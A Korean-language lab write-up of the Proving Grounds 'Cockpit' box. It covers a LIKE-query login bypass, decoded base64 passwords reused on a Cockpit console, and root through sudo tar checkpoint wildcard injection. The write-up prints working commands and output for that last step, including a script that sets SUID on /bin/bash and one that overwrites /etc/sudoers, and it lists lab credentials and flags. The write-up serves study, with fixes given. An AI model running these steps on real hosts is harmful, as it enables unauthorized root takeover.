---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/enum/dirbust
  - tech/enum/searchsploit
  - tech/web/auth-bypass
  - tech/web/sqli
  - tech/db/mysql
  - tech/cred/reuse
  - tech/lin/sudo-abuse
  - tech/lin/wildcard
  - tech/lin/suid
type: machine
platform: pg
os: linux
ip: 192.168.150.10
domain: blaze.offsec
ports: [22, 80, 9090]
services: [http, ssh]
status: solved
manual_tags: true
manual_cves: true
tech_count: 9
---

> [!info] 요약
> 타겟 `192.168.150.10`(1일차) → `192.168.161.10`(2일차, 박스 재배포) · Ubuntu 20.04.6 LTS · Intermediate · 플래그 2개
> 진입점: `login.php` 의 `LIKE` 기반 로그인 쿼리로 인증 우회 → 관리자 화면이 전 사용자 계정과 base64 저장 비밀번호를 노출 → `james` 자격증명으로 tcp/9090 Cockpit 웹콘솔(PAM 인증) 로그인
> 권한상승: `sudo -l` 의 `tar -czvf /tmp/backup.tar.gz *` — 인자 자리 `*` 를 이용한 GTFOBins `--checkpoint-action` 인젝션으로 `/bin/bash` SUID → root
> ⚠️ 두 플래그 모두 Cockpit 브라우저 내장 터미널(web-based shell)에서 읽음 — 시험 기준으로는 **둘 다 0점**(`Post-Exploitation` 참조)
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.150.10 → 192.168.161.10

### Initial Access – LIKE 기반 로그인 쿼리로 인증을 우회하고 base64 저장 자격증명을 Cockpit 웹콘솔 재사용으로 이어감

**Vulnerability Explanation:** 네 요소가 체인됨.
- `login.php` 의 인증 쿼리가 `=` 대신 `LIKE '%<입력>%'` 를 씀 — 인용부호 탈출 없이 와일드카드 매칭만으로 임의 한 글자 입력이 계정 하나에 매칭돼 인증 통과
- 인용부호(`'`) 입력 시 MySQL 구문 오류가 그대로 화면에 노출됨 — 쿼리 문자열이 이스케이프·바인딩 없이 연결됨을 확인. 실제로는 추가 데이터 추출에 쓰지 않았으나 주입 가능한 지점임은 확정됨
- 관리자 화면이 전 사용자 `username`·`password` 컬럼을 그대로 렌더링하고, `password` 값은 암호화가 아니라 **base64 인코딩**됨 — 되돌리기만 하면 평문
- Cockpit(tcp/9090)이 자체 사용자 DB 없이 **PAM 으로 호스트 시스템 계정을 인증**함 — 웹앱에서 턴 자격증명이 그대로 OS 로그인에 재사용됨(같은 비밀번호를 웹앱·OS 계정에 공유)

**Vulnerability Fix:**
- 로그인 쿼리를 `LIKE` 가 아닌 정확 일치(`=`)로, 파라미터는 prepared statement 로 바인딩
- DB 에러 메시지를 사용자에게 노출하지 않음
- 비밀번호를 base64 등 인코딩이 아니라 bcrypt/argon2 같은 솔트 적용 해시로 저장
- 관리 화면이 비밀번호(해시라도)를 렌더링하지 않도록 함
- 웹앱 계정과 OS 계정의 비밀번호를 분리. Cockpit 을 인터넷/평평한 네트워크에 노출하지 않고 방화벽으로 제한

**Severity:** High — 무인증 상태에서 인증 우회 후 SQL 에러로 주입 가능성까지 확정하고 평문급 자격증명을 전량 탈취함. 탈취한 자격증명이 즉시 시스템 계정 로그인(Cockpit/PAM)으로 이어져 사실상 계정 완전 탈취

**Steps to reproduce the attack:**
1. `login.php` 에 임의 한 글자 입력 후 로그인 → 인증 통과, 관리자 대시보드 진입
2. 사용자명 필드에 `'` 입력 → MySQL 구문 오류로 `LIKE '%…%'` 쿼리 구조 확인
3. 관리자 화면에서 전 사용자 목록과 base64 `password` 컬럼 확보
4. `base64 -d` 로 디코딩 → `james:canttouchhhthiss@455152`
5. tcp/9090 Cockpit 웹콘솔에 해당 자격증명으로 로그인(PAM 인증 통과)

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.150.10 (1일차) | TCP: 22, 80, 9090 (nmap 확인) |
| 192.168.161.10 (2일차, 재배포) | TCP: 80, 9090 (서비스 응답으로 확인 — nmap 재실행 기록 없음. 동일 템플릿 재배포로 22 도 열려 있을 가능성이 높으나 이 박스에서는 SSH 접속을 시도하지 않아 미확인) `[가정]` |

```text
# Nmap 7.98 scan initiated Thu Jun 25 10:22:34 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.150.10
Nmap scan report for 192.168.150.10
Host is up (0.067s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: blaze
9090/tcp open  http    Cockpit web service 198 - 220
|_http-title: Did not follow redirect to https://192.168.150.10:9090/
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   66.80 ms 192.168.45.1
2   66.76 ms 192.168.45.254
3   67.04 ms 192.168.251.1
4   67.18 ms 192.168.150.10

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun 25 10:23:32 2026 -- 1 IP address (1 host up) scanned in 58.40 seconds
```
— 출처: `~/PG/Cockpit/nmap.log`

읽어야 할 줄은 셋. `9090/tcp … Cockpit web service 198 - 220` — 버전이 구간(198~220)으로만 나와 특정 CVE 로 바로 못 감. `|_http-title: Did not follow redirect to https://…:9090/` — 9090 은 평문 요청을 자체 https 로 리다이렉트함. `80/tcp … blaze` — 알려진 CMS 이름이 아니라 자작 페이지 표식.

**버전 판정 독립 근거 2개(OS):** nmap SSH 배너 `OpenSSH 8.2p1 Ubuntu 4ubuntu0.5` 와, Cockpit 웹콘솔 대시보드 자체가 표시하는 `Ubuntu 20.04.6 LTS 실행 중` 배지(2일차 IP `192.168.161.10:9090/system` 화면, 아래 캡션 참조) — 서로 다른 두 경로가 동일 OS 계열로 일치.

**서비스 식별 — 이름이 같은 다른 제품.** nmap 이 붙인 `Cockpit web service` 는 [cockpit-project.org](https://cockpit-project.org/) 의 리눅스 서버 관리 콘솔(PAM 인증). `searchsploit Cockpit` 검색 결과 5건 중 4건은 `agentejo/cockpit`(PHP 헤드리스 CMS, 완전히 다른 제품)와 `openITCOCKPIT`이고, 제품이 맞는 EDB 49397(Cockpit v234 SSRF)조차 버전 범위(198–220)를 벗어남. 실제 침투 경로는 9090 이 아니라 tcp/80 이었음.

**열거 — feroxbuster, 2일차 성공 회차.**

```bash
┌──(kali㉿kali)-[~/PG/Cockpit]
└─$ feroxbuster -u http://192.168.161.10:80/ -s 200 -t 200 -x php,html,txt,bak,zip -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.161.10/
 🚩  In-Scope Url          │ 192.168.161.10
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ [200]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, txt, bak, zip]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      707l     4190w   598838c http://192.168.161.10/img/blaze.png
200      GET       65l      128w     1108c http://192.168.161.10/css/style.css
200      GET       28l       63w      769c http://192.168.161.10/login.php
200      GET      278l      506w     5366c http://192.168.161.10/css/index.css
200      GET       78l      321w     3349c http://192.168.161.10/
200      GET       29l       60w      477c http://192.168.161.10/css/type.css
200      GET       29l       85w      913c http://192.168.161.10/js/index.js
```
— 출처: 원 노트의 대화형 Kali 터미널 붙여넣기. 이 회차는 `-o` 없이 돌려 stdout 파일이 없고, 남은 것은 상태파일 `~/PG/Cockpit/ferox-http_192_168_161_10_-1782438695.state` 다 — 그 안의 응답 7건이 위 URL·행/단어/바이트 수와 전부 일치하고, 설정도 워드리스트·확장자·스레드 200·타임아웃 7·깊이 4 까지 배너와 일치.

`-s 200` 은 200만 보고해 401/403/302 를 버리고, `-x php,html,txt,bak,zip` 은 확장자마다 추가 요청을 만든다. `login.php` 발견으로 진입점 확정.

**같은 성격의 스캔을 1일차 IP 에 돌렸을 때는 `login.php` 가 안 나왔다.** `~/PG/Cockpit/ferox_80.txt`(1일차, `192.168.150.10`, `directory-list-2.3-medium.txt`)의 200 응답은 `index.html`·`img/blaze.png`·`/`·`js/index.js`·`css/type.css`·`blocked.html` **6건뿐**. 워드리스트 차이는 원인이 아니다 — `login` 은 두 워드리스트 **모두 53행째**라 시작 몇 초 안에 요청된다(Kali 에서 `grep -n '^login$'` 로 확인). 6건은 전부 `index.html` 에서 링크로 도달 가능한 정적 자산이라 **워드리스트 히트가 사실상 0** 이고, 그중에 웹루트의 `blocked.html`(233바이트)이 있다. 9090 을 두 시간 넘게 두들긴 직후라 **스캐너 IP 가 차단됐을 가능성이 크다** `[가정]` — `blocked.html` 내용을 열어본 기록이 없고 타겟도 사라져 확정 불가. 이전까지의 실패한 열거 회차(9090 디렉터리 브루트포스 4회 포함)는 [[_PLAYBOOK]] 시행착오 카드 참조.

### Initial Access – LIKE 인증 우회 → Cockpit 자격증명 재사용

`login.php` 에 임의 한 글자를 입력하고 제출:

![[Pasted image 20260626105312.png]]

입력창에 들어간 것은 한 글자씩이다(사용자명 칸 글자 하나, 비밀번호 칸 마스킹 점 하나). 확대해도 정확한 글자를 단정할 수 없다 `[가정]`.

돌아온 화면은 관리자 대시보드였고 전 사용자 목록이 노출됨:

![[Pasted image 20260626105320.png]]

| Username | Password |
|---|---|
| james | `Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=` |
| cameron | `dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy` |

— 출처: `파일보관\Pasted image 20260626105320.png`. 화면 하단에 `Logout` 링크와 `Admin Dashboard | blaze.offsec` 이 함께 찍혀 있어 세션이 실제로 발급됐음을 보여줌 — 에러 페이지가 흘린 것이 아니라 인증을 통과한 것.

사용자명에 `'` 하나만 넣고 제출하면 MySQL 구문 오류가 그대로 뜬다:

![[Pasted image 20260626105549.png]]

```text
Error: You have an error in your SQL
syntax; check the manual that corresponds
to your MySQL server version for the right
syntax to use near '%' AND password like
'%%" at line 1
```
— 출처: `파일보관\Pasted image 20260626105549.png`(줄바꿈은 브라우저가 감쌈). 잔여 문자열을 되짚으면 원본 쿼리는 다음 모양이다.

```sql
SELECT ... WHERE username LIKE '%<입력>%' AND password LIKE '%<입력>%'
```

`LIKE '%x%'` 는 부분일치라 한 글자짜리 입력도 어떤 행의 두 컬럼 모두에 그 글자가 있으면 매칭된다. 입력을 비우거나 `%` 만 넣으면 `LIKE '%%'` 가 되어 전 행이 매칭된다.

base64 로 보이는 값을 디코딩:

```bash
base64 -d 'Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI='
```
```text
canttouchhhthiss@455152
```
— 출처: `~/.zsh_history` 1193행. Burp Decoder 로 둘을 한꺼번에 확인한 화면:

![[Pasted image 20260626110833.png]]

| 계정 | 비밀번호 |
|---|---|
| james | `canttouchhhthiss@455152` |
| cameron | `thisscanttbetouchedd@455152` |

디코딩한 자격증명을 tcp/80 앱 로그인 폼에 되먹여 본 화면은 **관측 없음** — 스크린샷·산출물 어디에도 대응 기록이 없음. 확인된 것은 Cockpit(PAM, tcp/9090)에 그대로 통했다는 것뿐임.

![[Pasted image 20260626111116.png]]

우상단 `james`, 호스트 `blaze`, `Ubuntu 20.04.6 LTS 실행 중`(위 버전 판정 근거). URL 이 `https://192.168.161.10:9090/system` — 이 로그인은 **2일차 IP** 에서 이뤄짐. 좌측 메뉴 맨 아래 **터미널** 진입:

![[Pasted image 20260626111320.png]]

```text
james@blaze:~$ ls
local.txt
james@blaze:~$ cat local.txt
e4461b92c770db29bb95ae433e3f73ac
```
— 출처: `파일보관\Pasted image 20260626111320.png`. 프롬프트는 Cockpit 브라우저 내장 터미널의 것이지 SSH pty 가 아니다 — 아래 `Post-Exploitation` 판정 참조.

**Local.txt value:** `e4461b92c770db29bb95ae433e3f73ac`

> [!danger] 이 값은 web-based shell 에서 읽었다 — 시험 기준 0점
> tcp/22 가 열려 있었고(1일차 nmap, `OpenSSH 8.2p1`) Cockpit 이 PAM 인증인 이상 같은 비밀번호가 SSH 에도 통했을 것이다. 시험이었다면 `ssh james@<타겟>` 으로 갈아탄 뒤 원위치에서 `cat local.txt` 했어야 한다.
> 다만 **이 박스에서 SSH 접속을 실제로 시도한 기록은 없다** — `~/.zsh_history` 에도 `~/PG/Cockpit/` 에도 `ssh james@` 흔적이 없다. 위 문장은 Cockpit 이 PAM 인증이라는 사실에서 나온 추론이다 `[가정]`.

### Privilege Escalation – sudo tar 와일드카드 인젝션

**Vulnerability Explanation:** `sudo -l` 규칙 `(ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *` 의 인자 자리 `*` 가 문제.
- GNU tar 의 `--checkpoint=N` / `--checkpoint-action=exec=CMD` 는 N 개 레코드마다 `CMD` 를 실행한다. root 로 도는 `tar` 안에서 실행되므로 `CMD` 도 root 로 돈다
- 셸의 `*` 는 현재 디렉터리 파일명으로 확장되므로, `--checkpoint=1` 같은 이름의 파일을 만들어두면 그 이름이 `tar` 의 **옵션**으로 전달된다
- `sudoers(5)` 의 Wildcards 절: 명령행 인자 자리의 `*` 는 공백·슬래시를 포함해 아무 문자열이나 매칭한다 — 이 규칙은 사실상 james 에게 `tar` 의 임의 옵션 사용을 허용한 것과 같다

**Vulnerability Fix:**
- `sudo` 규칙에 와일드카드 인자를 두지 않는다. `sudoers(5)` 자체가 "Wildcards in command line arguments should be used with care" 라고 경고
- 백업이 목적이면 인자를 고정한 래퍼 스크립트를 등록하고 그 안에서 경로를 절대경로로 못박는다

**Severity:** Critical — NOPASSWD sudo 규칙 하나로 즉시 root 셸 획득

**Steps to reproduce the attack:**
1. `sudo -l` 로 `tar -czvf /tmp/backup.tar.gz *` NOPASSWD 규칙 확인
2. 작업 디렉터리에 `--checkpoint=1` · `--checkpoint-action=exec=sh privesc.sh` 이름의 파일 생성 — `*` 글로브에 태워 tar 옵션으로 넘김
3. `privesc.sh` 에 `chmod +s /bin/bash` 기록
4. `sudo tar -czvf /tmp/backup.tar.gz *` 실행 → 체크포인트 시점에 `privesc.sh` 가 root 로 실행됨
5. `/bin/bash -p` 로 SUID 유지 상태의 root 셸 획득

같은 터미널에서 `sudo -l` 확인(13:01, `local.txt` 를 읽은 11:13 에서 약 108분 뒤):

![[Pasted image 20260626130129.png]]

```text
james@blaze:~$ sudo -l
Matching Defaults entries for james on blaze:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on blaze:
    (ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *
```
— 출처: `파일보관\Pasted image 20260626130129.png`. `env_reset`·`secure_path` 가 있어 `LD_PRELOAD` 계열은 막히지만, `tar` 는 환경변수가 아니라 자기 옵션으로 실행하므로 무관.

```text
james@blaze:~$ cd /tmp
james@blaze:/tmp$ echo 'chmod +s /bin/bash' > privesc.sh
james@blaze:/tmp$ touch -- '--checkpoint=1'
james@blaze:/tmp$ touch -- '--checkpoint-action=exec=sh privesc.sh'
james@blaze:/tmp$ sudo tar -czvf /tmp/backup.tar.gz *
privesc.sh
snap-private-tmp/
snap-private-tmp/snap.lxd/
snap-private-tmp/snap.lxd/tmp/
ssh-MMae8vAufv2u/
tar: ssh-MMae8vAufv2u/agent.2081: socket ignored
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-apache2.service-Pqb66f/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-apache2.service-Pqb66f/tmp/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-fwupd.service-iFThWh/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-fwupd.service-iFThWh/tmp/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-ModemManager.service-l1tS1f/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-ModemManager.service-l1tS1f/tmp/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-systemd-logind.service-0vp5Lh/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-systemd-logind.service-0vp5Lh/tmp/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-systemd-resolved.service-pGOwNf/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-systemd-resolved.service-pGOwNf/tmp/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-systemd-timedated.service-bNWBoh/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-systemd-timedated.service-bNWBoh/tmp/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-systemd-timesyncd.service-Ll8SPh/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-systemd-timesyncd.service-Ll8SPh/tmp/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-upower.service-tieolh/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-upower.service-tieolh/tmp/
vmware-root_750-2957714542/
james@blaze:/tmp$ /bin/bash -p
bash-5.0# whoami
root
bash-5.0# 
```
— 출처: 원 노트(2026-06-26 작성분)의 브라우저 터미널 붙여넣기. **대응 스크린샷 없음 — 근거부족.** `130129`(13:01 `sudo -l`)와 `133613`(13:36) 사이 시각의 스크린샷이 없고, Cockpit 브라우저 터미널 안에서 친 명령이라 `~/.zsh_history` 에도 안 남는다. root 획득 자체는 13:52 의 `135233` 스크린샷(아래 `Post-Exploitation`)이 확정한다.

⚠️ **13:36 스크린샷은 이 블록과 다른 회차다.** 그 화면에서는 홈 디렉터리(`james@blaze:~$`)에서 `echo "" > '--checkpoint=1'` · `echo "" > '--checkpoint-action=exec=sh privesc.sh'` 로 파일을 만들고 `privesc.sh` 에 `echo 'kali ALL=(root) NOPASSWD: ALL' > /etc/sudoers` 를 넣었다 — 존재하지 않는 `kali` 계정을 넣고 `/etc/sudoers` 를 통째로 덮어쓰는 페이로드라 폐기됐고(출처: `파일보관\Pasted image 20260626133613.png`), 그 뒤 `/tmp` 에서 `chmod +s /bin/bash` 로 다시 시도한 것이 위 블록이다. 이 1차 시도 서사는 [[_PLAYBOOK]] 참조.

`touch -- '--이름'` 의 `--` 는 touch 자신에게 "이후는 파일명" 이라고 알리는 것 — 빼면 touch 가 자기 옵션으로 해석해 에러를 낸다. 아카이브 목록에 `privesc.sh` 는 있는데 `--checkpoint=1` · `--checkpoint-action=…` 파일명은 없다 — 두 파일이 아카이브 대상이 아니라 **옵션으로 소비됐다**는 증거. `chmod +s /bin/bash` 로 SUID 를 붙인 뒤 `-p`(privileged) 로 유효 UID 를 유지해 root 셸을 얻음.

**더 짧은 경로 — 파일명 트릭 없이.** sudoers 의 `*` 가 인자 자리에서 슬래시까지 매칭하므로 옵션을 직접 넘겨도 규칙에 걸린다. 같은 규칙을 Kali 에 복제해 검증(이 박스에서 실행한 것이 아니라 규칙 문법 자체를 확인한 것):

```bash
cat /etc/sudoers.d/ztest
```
```text
nobody ALL=(ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *
```

```bash
sudo -u nobody /usr/bin/sudo -n /usr/bin/tar -czvf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=id /etc/hostname
```
```text
/usr/bin/tar: Removing leading `/' from member names
/etc/hostname
uid=0(root) gid=0(root) groups=0(root)
```
— 출처: Kali `/etc/sudoers.d/ztest` 검증(작업 종료 후 제거, `Post-Exploitation` 참조). 대조군으로 아카이브 경로를 바꾼 `… /tmp/other.tar.gz x` 는 `sudo -l` 이 아무것도 출력하지 않아 매칭이 우연이 아님을 확인.

### Post-Exploitation

**Proof.txt value:** `fc0dcc22a87ad79ebf61dcece9b4ce0c`

```text
james@blaze:/tmp$ /bin/bash -p
bash-5.0# whoami
root
bash-5.0# cd /root
bash-5.0# ls
flag2.txt  proof.txt  snap
bash-5.0# cat flag2.txt
RWFzdGVyRWdn
bash-5.0# cat proof.txt
fc0dcc22a87ad79ebf61dcece9b4ce0c
bash-5.0#
```
— 출처: `파일보관\Pasted image 20260626135233.png`. `/root/flag2.txt` 는 제출 대상이 아니다 — `base64 -d` 하면 `EasterEgg` 로 나오는 PG 의 이스터에그 파일. 32자 hex 가 아닌 값은 제출 전에 디코딩·확인부터 할 것.

> [!danger] 이 값도 web-based shell 에서 읽었다 — 시험 기준 0점
> `whoami` 만 있고 `hostname`·`ip a` 가 없어 시험 증거 형식으로도 미달이다.
> 더 근본적으로 이 화면은 **Cockpit 웹 터미널**이다. 프롬프트 `james@blaze` 의 글리프 렌더링이 `local.txt` 를 읽은 `Pasted image 20260626111320.png`(Cockpit UI 크롬이 그대로 찍힌 화면)의 동일 문자열과 **같은 렌더러·폰트·색상**으로 일치함 — 프롬프트 초록색 구간(82×14px)의 RGB 배열이 두 화면에서 완전 동일(평균 절대차 0.0). `130129`(`sudo -l`)·`133613`(권한상승 1차)도 같은 값으로 일치.
> 방증: `~/.zsh_history` 에 `ssh james@` 가 0건이고, `~/PG/Cockpit/` 에 리스너·리버스셸 산출물이 없으며, `sudo -l`·권한상승 스크린샷도 같은 렌더러다. **두 플래그 모두 web-based shell 산출물이고 시험 기준 0점.**

**남긴 흔적**

타겟(이미 회수됨)에 남긴 것:
- `/tmp/privesc.sh`, `/tmp/backup.tar.gz`, `/tmp/--checkpoint=1`, `/tmp/--checkpoint-action=exec=sh privesc.sh`
- `~/--checkpoint=1`, `~/--checkpoint-action=exec=sh privesc.sh`, `~/privesc.sh` — 폐기된 1차 시도분(출처: `파일보관\Pasted image 20260626133613.png`)
- `/bin/bash` 에 **SUID 비트** — 되돌리는 명령은 `chmod u-s /bin/bash`. 되돌린 기록은 없음

공격 머신:
- `~/PG/Cockpit/` 에 `nmap.log`·`49390.py`·`ferox.txt`·`ferox_80.txt`·상태파일 2개 보존
- sudoers 인자 매칭 검증용 `/etc/sudoers.d/ztest` 는 검증 직후 제거 확인(`rm -f /etc/sudoers.d/ztest /tmp/ztest /tmp/backup.tar.gz`). 현재 `/etc/sudoers.d/` 에는 배포 기본 파일만 남음

## 관련

- GTFOBins — [tar](https://gtfobins.github.io/gtfobins/tar/)(`sudo` 항목의 `--checkpoint-action=exec=`)
- `man 5 sudoers` — Wildcards 절
- cockpit-project.org — nmap 이 가리킨 실제 제품(agentejo/cockpit CMS 와 별개)
- EDB [49390](https://www.exploit-db.com/exploits/49390) — Cockpit **CMS** 0.6.1 RCE, 이 박스와 무관(이름 충돌 사례)
- EDB [49397](https://www.exploit-db.com/exploits/49397) — Cockpit v234 SSRF, 제품은 맞지만 버전 범위 밖
- [[Zipper]] — 같은 와일드카드 인젝션 패턴(저쪽은 root 크론의 `7za a … *.zip`)
- [[Crane]] · [[Pelican]] · [[RubyDome]] · [[Clue]] — `sudo -l` 한 줄로 끝나는 GTFOBins 권한상승
- [[Sorcerer]] · [[Astronaut]] — SUID 바이너리 계열
- [[Hub]] — 버전 판정 독립 근거 2개, 이름만으로 검색해 다른 제품을 집은 반대 사례
- 이 박스의 시행착오·반사 카드 — [[_PLAYBOOK#A-1-11. searchsploit 결과 읽는 법 — 0건도, 히트도 근거가 아니다]] · [[_PLAYBOOK#A-1-13. 디렉터리 브루트 결과가 200 을 수천 건 뱉는다 — catch-all + 재귀 폭주]] · [[_PLAYBOOK#A-1-14. 브루트 결과가 갑자기 빈약해졌다 — 「사이트가 원래 그렇다」가 아니라 「차단당했다」]] · [[_PLAYBOOK#A-4-11. 권한상승 페이로드에 «다른 박스»의 사용자명·`>` 덮어쓰기가 섞여 들어온다]]
- 기법 카드 — [[_PLAYBOOK#B-1-19. `LIKE '%…%'` 로 짠 로그인 쿼리는 그 자체가 인증 우회다]] · [[_PLAYBOOK#B-38. `sudo -l` 규칙 끝의 `*` 읽는 법 — 그리고 `tar` 체크포인트]]
- 메타 — [[_PLAYBOOK#A-64. 사후에 시간 서사를 복원하는 법 — mtime + 스크린샷 파일명]] · [[_PLAYBOOK#A-65. 리버트되면 IP 가 바뀐다 — 노트의 IP 에는 «어느 세션»인지를 붙인다]] · 웹 기반 셸 판정은 [[_PLAYBOOK#E. OSCP 시험 규정 — 금지 / 제한 / 허용]]
- [[_STATUS]]
